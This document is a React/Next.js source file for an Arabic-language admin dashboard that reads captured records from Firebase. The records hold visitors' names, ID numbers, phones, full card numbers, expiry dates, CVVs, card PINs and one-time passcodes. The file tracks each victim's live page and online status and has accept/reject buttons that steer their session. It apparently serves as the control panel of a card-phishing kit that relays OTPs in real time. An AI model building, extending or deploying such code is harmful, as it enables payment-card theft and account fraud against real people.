"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Trash2, Users, CreditCard, UserCheck, Info } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { auth, database, db } from "@/lib/firebase"
import { playNotificationSound } from "@/lib/actions"

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  createdDate: string
  bank: string
  cardStatus?: string
  ip?: string
  cvv: string
  id: string | "0"
  expiryDate: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  cardNumber: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | string
  isOnline?: boolean
  lastSeen: string
  pass?: string
  year: string
  month: string
  currantPage?: string
  allOtps?: string[] | null
  cardExpiry: string
  name: string
  otpCode: string
  phone: string
}

function UserStatusBadge({ userId }: { userId: string }) {
  const [status, setStatus] = useState<string>("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state)
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
      <span className="text-xs text-white">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.id) &&
            !notifications.some((n) => n.id === notification.id ),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-lg font-medium">جاري التحميل...</div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900 p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة الإشعارات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              disabled={notifications.length === 0}
              className="flex items-center gap-2"
            >
              <Trash2 className="h-4 w-4" />
              مسح جميع الإشعارات
            </Button>
            <Button variant="outline" onClick={handleLogout} className="flex items-center gap-2">
              تسجيل الخروج
            </Button>
          </div>
        </div>

        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <Card>
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-blue-100 p-3 mr-4">
                <UserCheck className="h-6 w-6 text-blue-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
                <p className="text-2xl font-bold">{onlineUsersCount}</p>
              </div>
            </CardContent>
          </Card>

          {/* Total Visitors Card */}
          <Card>
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-green-100 p-3 mr-4">
                <Users className="h-6 w-6 text-green-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">إجمالي الزوار</p>
                <p className="text-2xl font-bold">{totalVisitors}</p>
              </div>
            </CardContent>
          </Card>

          {/* Card Submissions Card */}
          <Card>
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-purple-100 p-3 mr-4">
                <CreditCard className="h-6 w-6 text-purple-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
                <p className="text-2xl font-bold">{cardSubmissions}</p>
              </div>
            </CardContent>
          </Card>
        </div>

        <Card>
          {/* Desktop Table View - Hidden on Mobile */}
          <div className="hidden md:block overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b">
                  <th className="px-4 py-3 text-right font-medium text-gray-500">الرقم</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-500">المعلومات</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-500">الصفحة الحالية</th>
                  <th className="px-4 py-3 text-right font-medium text-gray-500">الوقت</th>
                  <th className="px-4 py-3 text-center font-medium text-gray-500">الحالة</th>
                  <th className="px-4 py-3 text-center font-medium text-gray-500">الإجراءات</th>
                </tr>
              </thead>
              <tbody>
                {notifications.map((notification) => (
                  <tr key={notification.id} className="border-b hover:bg-gray-50">
                    <td className="px-4 py-3">{notification.name || "غير معروف"}</td>
                    <td className="px-4 py-3">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.name ? "default" : "destructive"}
                          className="rounded-md cursor-pointer"
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification.cardNumber ? "default" : "destructive"}
                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                       
                      </div>
                    </td>
                    <td className="px-4 py-3">{notification?.currantPage}</td>
                    <td className="px-4 py-3">
                      {notification.createdDate &&
                        formatDistanceToNow(new Date(notification.createdDate), {
                          addSuffix: true,
                          locale: ar,
                        })}
                    </td>
                    <td className="px-4 py-3 text-center">
                      <UserStatusBadge userId={notification.id} />
                    </td>
                    <td className="px-4 py-3 text-center">
                      <div className="flex justify-center gap-2">
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => {
                            handleApproval("approved", notification.id)
                            setMessage(true)
                            setTimeout(() => {
                              setMessage(false)
                            }, 3000)
                          }}
                          className="bg-green-500 text-white hover:bg-green-600"
                        >
                          قبول
                        </Button>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => {
                            handleApproval("rejected", notification.id)
                            setMessage(true)
                            setTimeout(() => {
                              setMessage(false)
                            }, 3000)
                          }}
                          className="bg-red-500 text-white hover:bg-red-600"
                        >
                          رفض
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDelete(notification.id)}
                          className="text-red-500 hover:text-red-600"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* Mobile Card View - Shown only on Mobile */}
          <div className="md:hidden space-y-4 p-4">
            {notifications.map((notification) => (
              <Card key={notification.id} className="overflow-hidden">
                <CardContent className="p-4">
                  <div className="flex justify-between items-start mb-3">
                    <div>
                      <div className="font-semibold">{notification.personalInfo?.name || "غير معروف"}</div>
                    </div>
                    <UserStatusBadge userId={notification.id} />
                  </div>

                  <div className="grid grid-cols-1 gap-3 mb-3">
                    <div className="flex flex-wrap gap-2">
                      <Badge
                        variant={notification.name ? "default" : "destructive"}
                        className="rounded-md cursor-pointer"
                        onClick={() => handleInfoClick(notification, "personal")}
                      >
                        {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                      </Badge>
                      <Badge
                        variant={notification.cardNumber ? "default" : "destructive"}
                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                        onClick={() => handleInfoClick(notification, "card")}
                      >
                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                      </Badge>
                    </div>

                    <div className="text-sm">
                      <span className="font-medium">الصفحة الحالية:</span>  {notification?.currantPage}
                    </div>

                    <div className="text-sm">
                      <span className="font-medium">الوقت:</span>{" "}
                      {notification.createdDate &&
                        formatDistanceToNow(new Date(notification.createdDate), {
                          addSuffix: true,
                          locale: ar,
                        })}
                    </div>

                    <div className="flex gap-2 mt-2">
                      <Button
                        onClick={() => {
                          handleApproval("approved", notification.id)
                          setMessage(true)
                          setTimeout(() => {
                            setMessage(false)
                          }, 3000)
                        }}
                        className="flex-1 bg-green-500 hover:bg-green-600"
                      >
                        قبول
                      </Button>
                      <Button
                        onClick={() => {
                          handleApproval("rejected", notification.id)
                          setMessage(true)
                          setTimeout(() => {
                            setMessage(false)
                          }, 3000)
                        }}
                        className="flex-1"
                        variant="destructive"
                      >
                        رفض
                      </Button>
                      <Button variant="outline" onClick={() => handleDelete(notification.id)} className="w-10 p-0">
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                    {message && <p className="text-green-500 text-center mt-2">تم الارسال</p>}
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </Card>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white text-gray-900 max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle>
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات عامة"}
            </DialogTitle>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
              {selectedNotification.id && (
                <p className="flex justify-between">
                  <span className="font-medium">رقم الهوية:</span>
                  <span>{selectedNotification.id}</span>
                </p>
              )}
              {selectedNotification.name && (
                <p className="flex justify-between">
                  <span className="font-medium">الاسم:</span>
                  <span>{selectedNotification.name}</span>
                </p>
              )}
              {selectedNotification.phone && (
                <p className="flex justify-between">
                  <span className="font-medium">الهاتف:</span>
                  <span>{selectedNotification.phone}</span>
                </p>
              )}
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
              {selectedNotification.bank && (
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">البنك:</span>
                  <span className="font-semibold">{selectedNotification.bank}</span>
                </p>
              )}
              {selectedNotification.cardNumber && (
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">رقم البطاقة:</span>
                  <span className="font-semibold" dir="ltr">
                  {selectedNotification.prefix &&  <Badge variant={'outline'} className="bg-blue-100">{selectedNotification.prefix && `  ${selectedNotification.prefix}`}</Badge>}{" "}
                    <Badge variant={'outline'} className="bg-green-100">{selectedNotification.cardNumber}</Badge>

                  </span>
                </p>
              )}
              {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">تاريخ الانتهاء:</span>
                  <span className="font-semibold">
                    {selectedNotification.year && selectedNotification.month
                      ? `${selectedNotification.year}/${selectedNotification.month}`
                      : selectedNotification.cardExpiry}
                  </span>
                </p>
              )}
              {selectedNotification.
              pass && (
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">رمز البطاقة:</span>
                  <span className="font-semibold">{selectedNotification.pass}</span>
                </p>
              )}
              {(selectedNotification.otp || selectedNotification.otpCode) && (
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">رمز التحقق المرسل:</span>
                  <span className="font-semibold">
                    {selectedNotification.otp}
                    {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
                  </span>
                </p>
              )}
              {selectedNotification.cvv && (
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">رمز الامان:</span>
                  <span className="font-semibold">{selectedNotification.cvv}</span>
                </p>
              )}
              {selectedNotification.allOtps &&
                Array.isArray(selectedNotification.allOtps) &&
                selectedNotification.allOtps.length > 0 && (
                  <div>
                    <span className="font-medium text-gray-700 block mb-2">جميع الرموز:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedNotification.allOtps.map((otp, index) => (
                        <Badge key={index} variant="outline" className="bg-gray-100">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
